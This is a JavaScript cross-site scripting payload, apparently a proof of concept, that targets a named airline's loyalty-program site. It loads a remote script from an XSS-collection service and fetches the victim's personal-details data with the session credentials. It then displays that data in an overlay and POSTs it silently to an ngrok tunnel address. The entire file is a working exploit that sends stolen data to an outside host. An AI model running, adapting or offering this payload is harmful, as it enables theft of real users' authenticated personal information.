alert("XSS Load script");
import('https://xss.report/c/metoolze');
(function () {
  try {
    console.log("[XSS] PoC started");

    const banner = document.createElement("div");
    banner.innerText = "XSS ACTIVE - Accessing authenticated data...";
    banner.style = "position:fixed;top:0;left:0;width:100%;padding:6px;background:#000;color:#0f0;z-index:9999;font-size:13px;";
    document.body.appendChild(banner);

    fetch('https://www.singaporeair.com/krisflyer/getPageData?page=personal-details', {
      credentials: 'include'
    })
    .then(r => r.json())
    .then(data => {
      console.log("[XSS] Data:", data);

      const container = document.createElement("div");
      container.style = "position:fixed;bottom:0;left:0;width:100%;max-height:40%;overflow:auto;background:#111;color:#0f0;padding:10px;z-index:9999;font-size:12px;";
      container.innerHTML = `
        <h3>✅ XSS Executed - Sensitive Data Access</h3>
        <pre>${JSON.stringify(data)}</pre>
      `;
      document.body.appendChild(container);

      try {
        fetch("https://2a70-2402-8780-106f-a77d-a53d-1ac7-f835-677d.ngrok-free.app", {
          method: "POST",
          mode: "no-cors",
          headers: {
            "Content-Type": "text/plain"
          },
          body: JSON.stringify(data)
        });
      } catch(e) {
        console.log("[XSS] POST failed silently");
      }

    })
    .catch(err => {
      console.error("[XSS] Fetch error:", err);
    });

  } catch (e) {
    console.error("[XSS ERROR]", e);
  }
})();
